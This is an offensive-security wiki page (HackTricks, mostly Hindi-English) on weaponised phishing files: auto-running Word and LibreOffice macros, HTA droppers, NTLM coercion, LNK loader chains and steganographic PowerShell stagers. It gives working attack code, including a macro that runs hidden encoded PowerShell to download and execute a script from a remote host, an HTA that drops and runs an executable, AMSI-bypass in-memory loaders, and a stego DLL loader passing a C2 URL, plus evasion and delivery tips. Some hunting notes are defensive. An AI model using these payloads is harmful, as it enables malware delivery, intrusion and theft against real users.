# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word किसी file को खोलने से पहले उसके data की validation करता है। Data validation, OfficeOpenXML standard के अनुसार data structure identification के रूप में की जाती है। यदि data structure identification के दौरान कोई error होता है, तो analyse की जा रही file को खोला नहीं जाएगा।

आमतौर पर, macros वाली Word files में `.docm` extension का उपयोग होता है। हालांकि, file extension बदलकर file का नाम बदलना और फिर भी उसकी macro executing capabilities को बनाए रखना संभव है।\
उदाहरण के लिए, RTF file design के अनुसार macros को support नहीं करती, लेकिन RTF के नाम से rename की गई DOCM file को Microsoft Word द्वारा handle किया जाएगा और वह macro execution करने में सक्षम होगी।\
यही internals और mechanisms Microsoft Office Suite के सभी software (Excel, PowerPoint आदि) पर लागू होते हैं।

आप निम्न command का उपयोग करके यह जांच सकते हैं कि कुछ Office programs द्वारा कौन-सी extensions execute की जाएंगी:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files जो remote template (File –Options –Add-ins –Manage: Templates –Go) को reference करती हैं और जिनमें macros शामिल हैं, वे macros को भी “execute” कर सकती हैं।

### External Image Load

यहां जाएं: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, और **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: यहां जाएं: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Macros का उपयोग document से arbitrary code run करने के लिए किया जा सकता है।

#### Autoload functions

वे जितने अधिक common होंगे, AV द्वारा detect किए जाने की संभावना उतनी ही अधिक होगी।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadata को मैन्युअल रूप से हटाएँ

**File > Info > Inspect Document > Inspect Document** पर जाएँ, जिससे Document Inspector खुल जाएगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के सामने **Remove All** पर क्लिक करें।

#### Doc Extension

काम पूरा होने पर **Save as type** dropdown चुनें और format को **`.docx`** से बदलकर **Word 97-2003 `.doc`** करें।\
ऐसा इसलिए करें क्योंकि आप **`.docx` के अंदर macros save नहीं कर सकते** और macro-enabled **`.docm`** extension के **बारे में** एक **stigma** है (जैसे thumbnail icon पर बड़ा `!` होता है और कुछ web/email gateways इन्हें पूरी तरह block कर देते हैं)। इसलिए, यह **legacy `.doc` extension सबसे अच्छा समझौता है**।

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents में Basic macros embed किए जा सकते हैं और macro को **Open Document** event से bind करके file खुलने पर उन्हें auto-execute कराया जा सकता है (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> एक simple reverse shell macro इस प्रकार दिखता है:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
ध्यान दें कि string के अंदर doubled quotes (`""`) हैं – LibreOffice Basic literal quotes को escape करने के लिए इनका उपयोग करता है, इसलिए `...==""")` पर समाप्त होने वाले payloads अंदर के command और Shell argument, दोनों को संतुलित रखते हैं।

Delivery tips:

- `.odt` के रूप में save करें और macro को document event से bind करें, ताकि document खुलते ही यह तुरंत execute हो।
- `swaks` से email भेजते समय `--attach @resume.odt` का उपयोग करें (`@` आवश्यक है, ताकि attachment के रूप में filename string के बजाय file bytes भेजे जाएँ)। यह उन SMTP servers का abuse करते समय critical है, जो validation के बिना arbitrary `RCPT TO` recipients स्वीकार करते हैं।

## HTA Files

HTA एक Windows program है जो **HTML और scripting languages (जैसे VBScript और JScript) को combine करता है**। यह user interface generate करता है और browser के security model की constraints के बिना, एक "fully trusted" application के रूप में execute होता है।

HTA को **`mshta.exe`** का उपयोग करके execute किया जाता है, जो आमतौर पर **Internet Explorer** के साथ **installed** होता है, जिससे **`mshta` IE पर dependant रहता है**। इसलिए यदि इसे uninstall कर दिया गया है, तो HTAs execute नहीं हो पाएँगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

**NTLM authentication को "remotely" force करने** के कई तरीके हैं। उदाहरण के लिए, आप emails या HTML में **invisible images** जोड़ सकते हैं, जिन्हें user access करेगा (यहां तक कि HTTP MitM भी?)। या victim को ऐसी **files के addresses** भेज सकते हैं, जो केवल **folder खोलने** पर ही **authentication** को **trigger** करें।

**इन ideas और अन्य तरीकों को निम्नलिखित pages में देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication को steal ही नहीं कर सकते, बल्कि **NTLM relay attacks perform** भी कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Highly effective campaigns एक ZIP deliver करती हैं, जिसमें दो legitimate decoy documents (PDF/DOCX) और एक malicious .lnk होता है। Trick यह है कि actual PowerShell loader, ZIP के raw bytes में एक unique marker के बाद stored होता है, और .lnk उसे carve करके पूरी तरह memory में run करता है।<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner द्वारा implemented typical flow:

1) Common paths में original ZIP को locate करें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और current working directory के parent में।
2) ZIP bytes को read करें और एक hardcoded marker (जैसे xFIQCV) खोजें। Marker के बाद का सारा data embedded PowerShell payload है।
3) ZIP को %ProgramData% में copy करें, वहीं extract करें, और legitimate दिखाई देने के लिए decoy .docx खोलें।
4) Current process के लिए AMSI bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Next stage को deobfuscate करें (जैसे सभी # characters हटाकर) और उसे memory में execute करें।

Embedded stage को carve और run करने के लिए Example PowerShell skeleton:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery अक्सर reputable PaaS subdomains (जैसे, *.herokuapp.com) का दुरुपयोग करता है और payloads को gate कर सकता है (IP/UA के आधार पर benign ZIPs serve करना)।
- अगला stage अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts को न्यूनतम रखने के लिए Reflection.Emit + VirtualAlloc के माध्यम से उसे execute करता है।

Persistence used in the same chain
- Microsoft Web Browser control का COM TypeLib hijacking, ताकि IE/Explorer या इसे embed करने वाला कोई भी app payload को स्वतः re-launch कर दे।<sup>[[2]](#references)[[4]](#references)</sup> Details और ready-to-use commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ऐसे ZIP files जिनमें archive data के अंत में ASCII marker string (जैसे, xFIQCV) appended हो।
- ऐसा .lnk जो ZIP का पता लगाने के लिए parent/user folders को enumerate करता है और decoy document खोलता है।
- [System.Management.Automation.AmsiUtils]::amsiInitFailed के माध्यम से AMSI tampering।
- trusted PaaS domains के अंतर्गत hosted links के साथ समाप्त होने वाले लंबे समय तक चलने वाले business threads।

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

एक अन्य recurring pattern एक **document-impersonating `.lnk`** है, जो background में real chain को stage करते हुए तुरंत एक benign lure खोलता है।<sup>[[3]](#references)</sup>

Observed workflow:
1. Shortcut **PDF का रूप धारण करता है** और obfuscated PowerShell downloader को spawn करने के लिए `conhost.exe` या इसी प्रकार के proxy का उपयोग करता है।
2. PowerShell obvious tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) को fragments में बाँटता है, ताकि `iwr`, `gci`, `ren`, `cpi` या `schtasks` को खोजने वाले naive detections command को miss कर दें।
3. Stager पहले **decoy document download** करता है, victim के लिए उसे खोलता है, और फिर background में malicious files को reconstruct करता है।
4. Payloads को **junk extensions** के साथ लिखा जा सकता है और filler characters हटाकर rename किया जा सकता है, जिससे स्पष्ट `.exe` / `.cpl` artifacts दिखाई देने में देरी होती है।
5. Persistence एक **minute-based scheduled task** के साथ establish की जाती है, जो user-writable path से trusted host binary launch करता है।

इस pattern से मिलने वाले minimal hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
पहचानने योग्य एक उपयोगी staging layout है:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` या `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### दूसरा stage stealthy क्यों है

Rapid7 case study में, scheduled task ने बार-बार `C:\Users\Public\` से **`Fondue.exe`** लॉन्च किया। क्योंकि **`APPWIZ.cpl`** को इसके साथ staged किया गया था और वह **`RunFODW`** export करता था, इसलिए trusted Microsoft binary ने legitimate system copy के बजाय attacker CPL को side-load किया।

CPL ने:
- `C:\Windows\Tasks\editor.dat` से एक **AES-256-CBC** blob पढ़ा
- **Windows CNG / `bcrypt.dll`** के माध्यम से उसे decrypt किया
- executable memory allocate की और decrypted shellcode को उसमें copy किया
- **`EnumUILanguagesW`** के callback के रूप में shellcode pointer पास करके उसे indirectly execute किया

इस अंतिम चरण को अलग से hunt करना उपयोगी है: malware अक्सर direct `((void(*)())buf)()` jump से बचता है और execution transfer करने के लिए इसके बजाय **legitimate callback-taking WinAPI** का दुरुपयोग करता है।

इस campaign में decrypted payload **Donut** shellcode था, जिसने final PE को पूरी तरह memory में map किया और execution hand off करने से पहले current process में **AMSI/WLDP/ETW** को patch किया। Side-loading और memory-resident post-processing पर अधिक विस्तृत notes के लिए देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Practical hunting pivots:
- `.lnk` द्वारा `powershell.exe` या `conhost.exe` को spawn करना, जिसके बाद एक visible decoy document दिखाई दे।
- **`C:\Users\Public\`** में short-lived downloads, जिसके बाद nonsense extensions से तुरंत renames किए जाएँ।
- `GoogleErrorReport` जैसे साधारण नामों वाले scheduled tasks, जो **user-writable directories** से execute हों।
- Trusted binaries द्वारा उसी non-system directory से **`.cpl` / `.dll`** files load करना।
- **`C:\Windows\Tasks\`** के अंतर्गत लिखे गए Base64 text blobs, जिन्हें बाद में side-loaded module द्वारा पढ़ा जाए।

## Images में steganography-delimited payloads (PowerShell stager)

Recent loader chains एक obfuscated JavaScript/VBS deliver करते हैं, जो Base64 PowerShell stager को decode करके run करता है। वह stager एक image (अक्सर GIF) download करता है, जिसमें plain text के रूप में unique start/end markers के बीच छिपी Base64-encoded .NET DLL होती है। Script इन delimiters को खोजती है (जंगल में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>»), इनके बीच का text extract करती है, उसे Base64-decode करके bytes में बदलती है, assembly को in-memory load करती है और C2 URL के साथ एक ज्ञात entry method invoke करती है।<sup>[[5]](#references)</sup>

कार्यप्रवाह
- Stage 1: Archived JS/VBS dropper → embedded Base64 को decode करता है → `-nop -w hidden -ep bypass` के साथ PowerShell stager launch करता है।
- Stage 2: PowerShell stager → image download करता है, marker-delimited Base64 को carve करता है, .NET DLL को in-memory load करता है और C2 URL तथा options पास करके उसकी method (जैसे, VAI) call करता है।
- Stage 3: Loader final payload retrieve करता है और आमतौर पर उसे process hollowing के माध्यम से trusted binary (आम तौर पर MSBuild.exe) में inject करता है।<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing और trusted utility proxy execution के बारे में अधिक जानकारी यहाँ देखें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Image से DLL carve करके .NET method को in-memory invoke करने का PowerShell example:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

नोट्स
- यह ATT&CK T1027.003 (steganography/marker-hiding) है।<sup>[[6]](#references)</sup> Markers अलग-अलग campaigns में अलग हो सकते हैं।
- Assembly को load करने से पहले AMSI/ETW bypass और string deobfuscation सामान्य रूप से लागू किए जाते हैं।
- Hunting: डाउनलोड की गई images को ज्ञात delimiters के लिए scan करें; images को access करने और तुरंत Base64 blobs को decode करने वाले PowerShell की पहचान करें।

stego tools और carving techniques भी देखें:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार दिखाई देने वाला initial stage एक छोटी, heavily-obfuscated `.js` या `.vbs` file होती है, जिसे archive के अंदर deliver किया जाता है। इसका एकमात्र उद्देश्य embedded Base64 string को decode करना और `-nop -w hidden -ep bypass` के साथ PowerShell launch करके HTTPS के माध्यम से next stage को bootstrap करना है।<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- अपनी file के contents पढ़ें
- junk strings के बीच Base64 blob का पता लगाएँ
- ASCII PowerShell में decode करें
- `powershell.exe` को invoke करने वाले `wscript.exe`/`cscript.exe` के साथ execute करें

Hunting cues
- Archived JS/VBS attachments, जो command line में `-enc`/`FromBase64String` के साथ `powershell.exe` spawn करते हैं।
- User temp paths से `powershell.exe -nop -w hidden` launch करने वाला `wscript.exe`।

## NTLM hashes चुराने के लिए Windows files

**places to steal NTLM creds** के बारे में page देखें:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
